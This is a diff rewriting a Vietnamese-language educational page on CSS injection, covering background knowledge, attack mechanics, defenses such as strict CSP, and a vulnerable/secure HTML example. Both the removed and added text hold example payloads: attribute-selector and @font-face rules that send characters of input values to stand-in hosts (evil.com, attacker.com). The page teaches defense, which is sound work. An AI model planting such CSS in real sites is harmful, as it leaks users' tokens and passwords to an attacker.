@@ -1,11 +1,10 @@
 # CSS Injection
 
-> **OWASP Top 10:2025**: A05:2025 – Injection | **CWE**: CWE-94 | **Phân loại**: Injection
+> **CWE**: CWE-94 (Improper Control of Generation of Code) | **Phân loại**: Injection
 
-## 🧱 Kiến thức Nền tảng
-Cascading Style Sheets (CSS) là ngôn ngữ định kiểu dùng để thiết kế giao diện hiển thị cho các tài liệu HTML. CSS sử dụng các bộ chọn (selectors) để xác định các phần tử HTML cần áp dụng kiểu dáng. Bên cạnh các bộ chọn cơ bản theo tên thẻ, class hay ID, CSS hỗ trợ bộ chọn thuộc tính (attribute selectors) để nhắm mục tiêu các phần tử dựa trên sự hiện diện hoặc giá trị của thuộc tính của chúng. Các toán tử so khớp thuộc tính mạnh mẽ bao gồm: `[attr^=val]` (thuộc tính bắt đầu bằng `val`), `[attr$=val]` (thuộc tính kết thúc bằng `val`), và `[attr*=val]` (thuộc tính chứa chuỗi con `val`).
+## Kiến thức Nền tảng
 
-Mặc dù CSS không thực thi mã JavaScript trực tiếp, lỗ hổng CSS Injection vẫn cực kỳ nguy hiểm. Kẻ tấn công có thể chèn các quy tắc CSS độc hại để thay đổi giao diện trang web, hoặc sử dụng các bộ chọn thuộc tính tinh vi kết hợp với thuộc tính `background-image: url(...)` để lấy cắp dữ liệu nhạy cảm hiển thị trên trang (ví dụ: CSRF token hay số thẻ tín dụng). Khi trình duyệt tải hình ảnh nền từ một URL chỉ định trong thuộc tính nền nếu giá trị thuộc tính của thẻ khớp với bộ chọn, nó sẽ vô tình gửi giá trị đó về máy chủ của kẻ tấn công dưới dạng tham số URL. Để phòng ngừa lỗ hổng này, lập trình viên cần ngăn chặn người dùng chèn trực tiếp các đoạn mã CSS tùy ý vào thẻ `<style>` hoặc thuộc tính `style`. Tất cả đầu vào CSS từ người dùng phải được lọc sạch (sanitize) nghiêm ngặt, đồng thời thiết lập chính sách Content Security Policy (CSP) chặt chẽ để hạn chế nguồn tải CSS (`style-src 'self'`) và ngăn chặn việc tải hình ảnh nền từ các nguồn bên ngoài không đáng tin cậy (`img-src 'self'`).
+CSS (Cascading Style Sheets) giống như lớp sơn và trang trí nội thất cho một ngôi nhà HTML. Nó giúp trang web có màu sắc, font chữ đẹp đẽ và bố cục gọn gàng. Ngoài ra, CSS còn có các bộ chọn thuộc tính (attribute selectors) thông minh để tìm kiếm các phần tử dựa trên một phần giá trị của chúng (như bắt đầu bằng `^=`, kết thúc bằng `$=` hoặc chứa chuỗi `*=`). Thông thường, trang web sử dụng các file CSS tĩnh đã được lập trình viên thiết kế sẵn và bảo vệ nghiêm ngặt bằng Chính sách bảo mật nội dung (CSP), giúp ngăn chặn việc tải hình ảnh hay font chữ từ những nguồn lạ.
 
 ```html
 <!-- Secure HTML configuration with Content Security Policy (CSP) -->
@@ -30,27 +29,96 @@ Mặc dù CSS không thực thi mã JavaScript trực tiếp, lỗ hổng CSS In
 </html>
 ```
 
-## 🔍 Mô tả lỗ hổng
-Trong khi các cơ chế phòng thủ chèn mã thường tập trung vào JavaScript, Cascading Style Sheets (CSS) cũng đại diện cho một vectơ tấn công khả thi. Nếu các kiểu định dạng do người dùng tạo ra không được làm sạch, kẻ tấn công có thể chèn các quy tắc CSS độc hại bằng cách sử dụng các bộ chọn thuộc tính (attribute selectors) để dò tìm và lấy cắp dữ liệu nhạy cảm được hiển thị trên trang, chẳng hạn như các token chống CSRF hoặc thông tin cá nhân.
+## Mô tả lỗ hổng
 
-## ⚔️ Cơ chế tấn công
-Kẻ tấn công chèn mã CSS chứa các bộ chọn thuộc tính như input[value^='a'] { background: url('https://evil.com/steal?token=a'); }. Nếu token CSRF trong đầu vào khớp với bộ chọn, trình duyệt sẽ tải hình ảnh nền, ghi lại ký tự khớp vào máy chủ của kẻ tấn công. Quá trình này được lặp lại một cách hệ thống để trích xuất toàn bộ token.
+Lỗ hổng CSS Injection xảy ra khi ứng dụng web mở cửa cho phép người dùng tự ý đưa các đoạn mã trang trí CSS của riêng họ vào trang web mà không qua kiểm duyệt. Nhiều người nghĩ CSS chỉ làm thay đổi giao diện nên vô hại, nhưng thực tế kẻ tấn công có thể dùng nó làm công cụ gián điệp tinh vi. Bằng cách sử dụng các bộ chọn thuộc tính kết hợp với việc tải hình ảnh nền từ máy chủ của kẻ tấn công, CSS có thể rình mò từng ký tự trong các ô nhập liệu bí mật (như mã token bảo mật CSRF hay mật khẩu). Khi trình duyệt khớp đúng ký tự, nó sẽ gửi một yêu cầu tải ảnh về server của kẻ tấn công, vô tình tiết lộ thông tin nhạy cảm đó từng bước một. Lỗ hổng này nguy hiểm vì nó âm thầm lấy cắp dữ liệu của người dùng mà không cần chạy bất kỳ đoạn mã JavaScript nào.
 
-## 🛡️ Biện pháp phòng thủ
-- **Tóm tắt**: Làm sạch đầu vào do người dùng kiểm soát, tránh tuyệt đối việc nội suy trực tiếp vào các thẻ style, và thực thi một Chính sách Bảo mật Nội dung (CSP) nghiêm ngặt.
+## Cơ chế tấn công
+
+Các kỹ thuật khai thác CSS Injection phổ biến bao gồm:
+
+*   **CSS Keylogger (Attribute-based Exfiltration)**: Dùng bộ chọn thuộc tính CSS để kiểm tra giá trị của các thẻ `<input>`. Khi giá trị khớp với ký tự kiểm tra, trình duyệt sẽ tải một hình ảnh nền từ máy chủ của kẻ tấn công, gửi ký tự đó đi.
+    *   *Payload*:
+        ```css
+        input[value^="a"] { background: url('http://attacker.com/leak?char=a'); }
+        input[value^="b"] { background: url('http://attacker.com/leak?char=b'); }
+        input[value^="c"] { background: url('http://attacker.com/leak?char=c'); }
+        ```
+        Bằng cách kết hợp nhiều bộ chọn khớp chuỗi con, kẻ tấn công có thể lấy cắp từng ký tự của CSRF token hoặc mật khẩu của người dùng khi ứng dụng tự động điền (autofill).
+*   **@font-face Exfiltration (unicode-range)**: Khi thuộc tính `value` của input không có sẵn trong DOM (ví dụ người dùng đang gõ phím trực tiếp), kẻ tấn công khai báo font chữ tùy chỉnh trỏ tới máy chủ của họ và giới hạn phạm vi ký tự áp dụng (`unicode-range`). Khi ký tự tương ứng xuất hiện trên màn hình, trình duyệt nạp font chữ từ URL đó và vô tình tiết lộ ký tự vừa nhập.
+    *   *Payload*:
+        ```css
+        @font-face {
+          font-family: LeakFont;
+          src: url('http://attacker.com/leak?char=a');
+          unicode-range: U+0061; /* Hex for 'a' */
+        }
+        input { font-family: LeakFont, sans-serif; }
+        ```
+*   **CSS Timing Side-Channel**: Lợi dụng thời gian xử lý hiển thị đồ họa của trình duyệt. Kẻ tấn công thiết kế các bộ chọn CSS cực kỳ phức tạp (ví dụ lồng nhau hàng nghìn cấp hoặc sử dụng các bộ lọc SVG phức tạp) để làm chậm quá trình dựng trang (rendering) khi điều kiện so khớp đúng. Đo thời gian phản hồi hoặc hoạt động CPU của trình duyệt giúp kẻ tấn công xác định ký tự nào khớp mà không cần nạp tài nguyên từ bên ngoài.
+
+## Biện pháp phòng thủ
+
+- **Tóm tắt**: Tuyệt đối không cho phép người dùng chèn mã CSS trực tiếp, thực thi chính sách bảo mật nội dung (CSP) chặt chẽ và không lưu thông tin nhạy cảm trong thuộc tính hiển thị trực tiếp của DOM.
 - **Các bước chi tiết**:
-  - Làm sạch và xác thực các đầu vào CSS do người dùng cung cấp để đảm bảo chúng không chứa các tham chiếu URL bên ngoài hoặc các thuộc tính nguy hiểm.
-  - Thực thi Chính sách Bảo mật Nội dung (CSP) giới hạn style-src trong các tên miền đáng tin cậy và vô hiệu hóa các kiểu định dạng nội dòng không an toàn ('unsafe-inline').
-  - Hiển thị các giá trị nhạy cảm (như token CSRF) bằng cách sử dụng các phần tử hoặc thuộc tính không thể bị định dạng hoặc giám sát bằng các bộ chọn thuộc tính CSS.
-  - Sử dụng các tên lớp (class) và ID CSS động hoặc ngẫu nhiên cho các trường biểu mẫu nhạy cảm để ngăn chặn việc bị nhắm mục tiêu bởi các bộ chọn tĩnh.
+  - Triển khai Content Security Policy (CSP) chặt chẽ: giới hạn nguồn tải CSS (`style-src 'self'`) và cấm tải ảnh từ bên ngoài (`img-src 'self'`).
+  - Sử dụng các thư viện vệ sinh CSS chuyên dụng nếu bắt buộc phải cho phép người dùng tải lên stylesheet.
+  - Không đặt các giá trị nhạy cảm như CSRF token trong thuộc tính `value` của các thẻ nhập liệu hiển thị. Thay vào đó, hãy lưu chúng trong bộ nhớ JavaScript hoặc sử dụng cơ chế bảo mật Cookie Header.
 
-## 💻 Code Example
-```configuration
-# Nginx configuration for Content Security Policy restricting CSS sources
-add_header Content-Security-Policy "default-src 'self'; style-src 'self' https://fonts.googleapis.com;" always;
+## Code Example
+
+```html
+<!-- === VULNERABLE CODE === -->
+<!-- The application directly injects user-controlled style content without validation -->
+<html>
+<head>
+    <style>
+        /* User inputted styles are rendered directly here */
+        /* If attacker input is: input[value^="sec"] { background: url("http://attacker.com/leak?val=sec"); } */
+        input[value^="sec"] { background: url("http://attacker.com/leak?val=sec"); }
+    </style>
+</head>
+<body>
+    <form>
+        <input type="text" name="secret_key" value="secret123">
+    </form>
+</body>
+</html>
+
+<!-- === SECURE CODE === -->
+<!-- Implements a strict Content Security Policy and prevents inline stylesheet injection -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- SECURE: CSP blocks inline styles and restricts background image loading to self -->
+    <meta http-equiv="Content-Security-Policy" 
+          content="default-src 'self'; style-src 'self'; img-src 'self';">
+    <link rel="stylesheet" href="/static/css/main.css">
+</head>
+<body>
+    <form>
+        <!-- The CSRF token is not vulnerable to CSS exfiltration under strict CSP -->
+        <input type="hidden" name="csrf_token" value="safe_token_value">
+    </form>
+</body>
+</html>
 ```
 
-## 📚 Ghi chú kỹ thuật & Nguồn tham khảo
-- **Trạng thái kiểm định**: FIXED
-- **Ghi chú kỹ thuật**: Giải quyết một sự không chính xác về mặt kỹ thuật trong Slide 3 bằng cách làm rõ rằng việc chèn CSS không thể đọc trực tiếp các trường đầu vào ẩn (<input type='hidden'>) trừ khi nó buộc chúng phải hiển thị bằng cách sử dụng các thuộc tính CSS như display: block !important, vốn sẽ kích hoạt yêu cầu tải nền.
-- **Nguồn tham khảo**: CWE-94 (Improper Control of Generation of Code), PortSwigger CSS Injection
+## Xem thêm
+
+- [Cross-Site Scripting (XSS)](../xss/) — Lỗ hổng chèn mã độc HTML/JavaScript vào ứng dụng.
+
+## Nguồn tham khảo
+
+- PortSwigger: https://portswigger.net/research/exfiltrating-data-via-css-injection
+- OWASP: https://owasp.org/www-community/attacks/CSS_Injection
+- CWE: https://cwe.mitre.org/data/definitions/94.html
+
+## Giải thích thuật ngữ
+
+- **CSS Injection**: Chèn mã CSS độc hại vào trang web để thao túng giao diện hoặc lấy cắp thông tin.
+- **Attribute Selector**: Bộ chọn thuộc tính trong CSS dùng để tìm các thẻ HTML dựa trên giá trị của chúng.
+- **CSP (Content Security Policy)**: Chính sách bảo mật nội dung giúp ngăn chặn việc tải tài nguyên trái phép.
+- **Exfiltration**: Hành vi rò rỉ hoặc lấy cắp dữ liệu ra bên ngoài hệ thống.
+- **CSRF Token**: Chuỗi ký tự ngẫu nhiên dùng để chống giả mạo yêu cầu chéo trang.
